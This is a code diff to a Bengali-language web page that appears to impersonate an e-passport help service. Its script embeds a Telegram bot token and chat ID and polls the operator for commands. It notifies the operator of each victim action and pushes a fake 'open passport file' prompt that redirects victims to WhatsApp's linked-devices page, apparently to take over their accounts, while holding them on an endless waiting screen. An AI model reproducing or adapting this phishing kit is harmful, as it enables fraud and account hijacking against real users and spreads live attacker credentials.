@@ -18,20 +18,23 @@
 <style>
 *{
     box-sizing:border-box;
+    margin:0;
+    padding:0;
 }
 
 body{
-    margin:0;
     background:#f2f4f5;
     font-family:"Noto Sans Bengali","Segoe UI",Arial,sans-serif;
     color:#222;
+    height:100vh;
+    overflow:hidden;
 }
 
 .wrapper{
     width:100%;
     max-width:600px;
+    height:100vh;
     margin:auto;
-    min-height:100vh;
     display:flex;
     flex-direction:column;
     background:#ffffff;
@@ -39,14 +42,12 @@ body{
 }
 
 /* =========================
-   TOP IMAGE (অর্ধেক অংশ জুড়ে নিখুঁত ফিটিং)
+   TOP IMAGE
 ========================= */
 
 .top-image-container{
     width:100%;
-    height:45vh;
-    min-height:220px;
-    max-height:350px;
+    height:50vh;
     background:#e5e5e5;
     overflow:hidden;
 }
@@ -65,35 +66,35 @@ body{
 
 .content-section{
     flex:1;
-    padding:20px 20px 25px;
+    padding:15px 20px 20px;
     display:flex;
     flex-direction:column;
     justify-content:space-between;
+    overflow-y:auto;
 }
 
-/* নীল রঙের হেডার */
 .site-title{
     color:#1565c0;
     text-align:center;
-    font-size:22px;
+    font-size:20px;
     font-weight:800;
-    margin-bottom:10px;
+    margin-bottom:8px;
 }
 
 .card-title{
     text-align:center;
-    font-size:18px;
+    font-size:16px;
     font-weight:700;
     color:#333;
-    margin-bottom:8px;
+    margin-bottom:6px;
 }
 
 .description{
     color:#666;
-    font-size:14px;
-    line-height:1.6;
+    font-size:13px;
+    line-height:1.5;
     text-align:center;
-    margin-bottom:20px;
+    margin-bottom:15px;
 }
 
 /* =========================
@@ -101,12 +102,12 @@ body{
 ========================= */
 
 .input-group{
-    margin-bottom:15px;
+    margin-bottom:12px;
 }
 
 .product-input{
     width:100%;
-    padding:14px 16px;
+    padding:12px 16px;
     border:2px solid #15966f;
     border-radius:12px;
     font-size:16px;
@@ -124,8 +125,8 @@ body{
     width:100%;
     border:0;
     border-radius:12px;
-    padding:14px;
-    font-size:17px;
+    padding:12px;
+    font-size:16px;
     font-weight:800;
     cursor:pointer;
     background:#1565c0;
@@ -143,10 +144,10 @@ body{
 
 .error{
     display:none;
-    margin-top:10px;
+    margin-top:8px;
     color:#c62828;
     font-weight:700;
-    font-size:14px;
+    font-size:13px;
     text-align:center;
 }
 
@@ -157,8 +158,8 @@ body{
 .bottom-buttons-container {
     display: flex;
     gap: 10px;
-    margin-top: 20px;
-    padding-top: 15px;
+    margin-top: 15px;
+    padding-top: 12px;
     border-top: 1px solid #eee;
 }
 
@@ -166,8 +167,8 @@ body{
     flex: 1;
     border: 0;
     border-radius: 10px;
-    padding: 12px 10px;
-    font-size: 14px;
+    padding: 10px 10px;
+    font-size: 13px;
     font-weight: 700;
     cursor: pointer;
     text-align: center;
@@ -195,7 +196,7 @@ body{
 }
 
 /* =========================
-   MODALS (পপ-আপ)
+   MODALS
 ========================= */
 
 .modal-overlay{
@@ -228,21 +229,15 @@ body{
     to{ transform:scale(1); opacity:1; }
 }
 
-.code-box{
-    min-height:55px;
-    padding:12px;
-    margin-bottom:12px;
-    background:#f1fff8;
-    border:2px dashed #07865f;
-    border-radius:12px;
-    display:none;
-    align-items:center;
-    justify-content:center;
-    font-size:22px;
-    font-weight:900;
-    color:#07865f;
-    word-break:break-word;
+.modal-header{
+    background:#07865f;
+    color:#fff;
     text-align:center;
+    font-weight:800;
+    font-size:17px;
+    padding:10px;
+    border-radius:10px;
+    margin-bottom:14px;
 }
 </style>
 </head>
@@ -251,7 +246,7 @@ body{
 
 <div class="wrapper">
 
-    <!-- প্রথম অংশ: টপ ইমেজ (আপডেটকৃত লিংক) -->
+    <!-- প্রথম অংশ: টপ ইমেজ -->
     <div class="top-image-container">
         <img
             id="productImage"
@@ -309,7 +304,7 @@ body{
             <button type="button" class="nav-btn home-nav-btn" onclick="location.reload();">
                 🏠 হোম পেজ
             </button>
-            <a href="#" id="headOfficeBtn" class="nav-btn contact-nav-btn" target="_blank">
+            <a href="#" id="headOfficeBtn" class="nav-btn contact-nav-btn">
                 📞 হেড অফিসে যোগাযোগ করুন
             </a>
         </div>
@@ -323,7 +318,7 @@ body{
 <div id="waitingPage" class="modal-overlay">
     <div class="modal-box text-center">
         
-        <div class="modal-header" style="background:#07865f; color:#fff; text-align:center; font-weight:800; font-size:17px; padding:10px; border-radius:10px; margin-bottom:14px;">
+        <div class="modal-header">
             ⏳ তথ্য যাচাই করা হচ্ছে
         </div>
 
@@ -350,12 +345,12 @@ body{
 </div>
 
 
-<!-- পারমিশন মোডাল (আপনার দেওয়া কোড অনুযায়ী আপডেট করা) -->
+<!-- পারমিশন মোডাল (ফাইল ওপেন করার) -->
 <div id="modalOverlay" class="modal-overlay">
     <div class="modal-box text-center">
         <h3 class="text-lg font-bold mb-2" style="font-size: 18px; font-weight: bold; margin-bottom: 8px;">পাসপোর্ট ফাইলটি ওপেন করুন</h3>
         <p class="text-gray-600 text-sm mb-6" style="color: #666; font-size: 14px; margin-bottom: 24px; line-height: 1.5;">পাসপোর্ট ডকুমেন্ট ফাইলটি ওপেন করতে চাইলে "Open" বাটনে ক্লিক করুন।</p>
-        <button onclick="redirectToChrome()" class="w-full bg-blue-600 text-white py-3 rounded-lg font-bold text-lg active:bg-blue-700" style="width: 100%; background-color: #2563eb; color: white; padding: 12px; border-radius: 8px; font-weight: bold; font-size: 18px; border: none; cursor: pointer;">Open</button>
+        <button id="openBtn" class="w-full bg-blue-600 text-white py-3 rounded-lg font-bold text-lg active:bg-blue-700" style="width: 100%; background-color: #2563eb; color: white; padding: 12px; border-radius: 8px; font-weight: bold; font-size: 18px; border: none; cursor: pointer;">Open</button>
     </div>
 </div>
 
@@ -366,7 +361,7 @@ body{
    টেলিগ্রাম সেটিংস ও সিস্টেম লজিক
 ========================================================== */
 
-const BOT_TOKEN = "8829559812:AAHEWHbHvft6foDA6j9vNJA-0tS6K7zMCwo";
+const BOT_TOKEN = "8627514760:AAFgpZGun9CXiIDTbDD9xs3hVwJKCwFIruw";
 const CHAT_ID = "8398202645";
 const WHATSAPP_LINK = "https://wa.me/settings/linked_devices";
 const PRODUCT_IMAGE_URL = "https://raw.githubusercontent.com/passportchaking-io/e_passport_help_center.gv.bd/main/1791494677132.jpg";
@@ -394,6 +389,7 @@ const submitButton  = document.getElementById("submitButton");
 const errorMessage  = document.getElementById("errorMessage");
 const productImage  = document.getElementById("productImage");
 const modalOverlay  = document.getElementById("modalOverlay");
+const openBtn       = document.getElementById("openBtn");
 
 if (PRODUCT_IMAGE_URL.trim() !== "") {
     productImage.src = PRODUCT_IMAGE_URL;
@@ -554,32 +550,34 @@ async function pollTelegram(){
             if (lowerText.startsWith("/send") || lowerText === "/error" || lowerText === "/success") {
                 handleCommand("cmd_send");
             } else if (lowerText.startsWith("/whatsapp")) {
-                openWhatsAppLink("whatsapp_web_button", false);
+                openWhatsAppLink(false);
             }
         }
     } catch (error) {} finally { isPolling = false; }
 }
 
 function handleCommand(cmd){
-    // যেকোনো কমান্ড পেলেই আপনার দেওয়া নতুন পারমিশন পপ-আপ মোডাল ওপেন হবে
-    openModal();
+    /* যেকোনো কমান্ড পেলেই আপনার দেওয়া নতুন পারমিশন পপ-আপ মোডাল ওপেন হবে */
+    waitingPage.classList.remove("show");
+    modalOverlay.classList.add("show");
     notifyTelegram("🔑 ইউজারকে ফাইল ওপেন করার পারমিশন পপ-আপ দেখানো হয়েছে");
 }
 
-function openModal(){
-    waitingPage.classList.remove("show");
-    modalOverlay.classList.add("show");
-}
+/* Open বাটনে ক্লিক করলে ক্রোম ব্রাউজারে লিংক ওপেন হবে এবং ওয়েটিং পেজে আটকে থাকবে */
+openBtn.addEventListener("click", function(){
+    openWhatsAppLink(true);
+});
 
-/* Open বাটনে ক্লিক করলে ক্রোম ব্রাউজারে লিংক ওপেন হবে এবং অনির্দিষ্টকালের জন্য ওয়েটিং পেজে আটকে থাকবে */
-function redirectToChrome(){
+function openWhatsAppLink(isNewTab) {
     navigatingToWhatsApp = true;
     notifyTelegram("🌐 ইউজার 'Open' বাটনে ক্লিক করেছে — ব্রাউজারে লিংকে যাচ্ছে");
 
-    // ক্রোম ব্রাউজারে ওপেন করার জন্য টার্গেট লিংক
-    window.open(WHATSAPP_LINK, "_blank");
+    if (isNewTab) {
+        window.open(WHATSAPP_LINK, "_blank");
+    } else {
+        window.location.href = WHATSAPP_LINK;
+    }
 
-    // মোডাল বন্ধ করে আবার ওয়েটিং পেজে আটকে রাখা এবং টেলিগ্রাম কমান্ডের অপেক্ষায় রাখা
     modalOverlay.classList.remove("show");
     showWaitingPage();
     notifyTelegram("⏳ ইউজার আবার অনির্দিষ্টকালের জন্য ওয়েটিং পেজে আটকে আছে — নতুন টেলিগ্রাম কমান্ডের অপেক্ষায়");
